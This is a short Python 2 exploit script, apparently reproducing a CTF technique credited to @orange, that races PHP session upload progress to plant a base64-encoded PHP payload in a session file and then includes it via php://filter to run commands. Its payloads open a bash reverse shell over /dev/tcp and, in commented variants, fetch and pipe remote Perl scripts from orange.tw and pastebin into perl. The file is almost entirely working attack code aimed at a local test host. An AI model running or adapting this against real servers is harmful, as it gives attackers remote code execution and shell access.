#Credits : @orange
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool



#HOST = 'http://54.250.246.238/'
HOST='http://localhost/Trash/test5.php'
sess_name = 'tarunkant'

headers = {
    #'Connection': 'close',
    'Cookie': 'PHPSESSID=' + sess_name
}

#payload = '@<?php `curl orange.tw/w/bc.pl|perl -`;?>'
#payload = '@<?php `bash -c "sh -i >& /dev/tcp/xxx.xxx.xxx.xxx/1234 0>&1"` ;?>'
payload = '@<?php `bash -c "sh -i >& /dev/tcp/127.0.0.1/1234 0>&1"` ; echo "hey";?>'
#payload = '@<?php `curl xxx.xxx.xxx.xxx/shell.pl|perl -`; ?>'
#payload = '@<?php system("curl https://pastebin.com/raw/mugBGTdB|perl -"); ?>'


while 1:
    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
    x = b64encode(payload + junk)
    xx = b64encode(b64encode(payload + junk))
    xxx = b64encode(b64encode(b64encode(payload + junk)))
    if '=' not in x and '=' not in xx and '=' not in xxx:
        payload=xxx
	print payload
        break

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS':  'ZZ' + payload
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        print r.text
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    filename = 'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s' % filename
    print filename
    while 1:
        url = '%s?orange=%s' % (HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        if c and 'orange' not in c:
            print [c]


if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
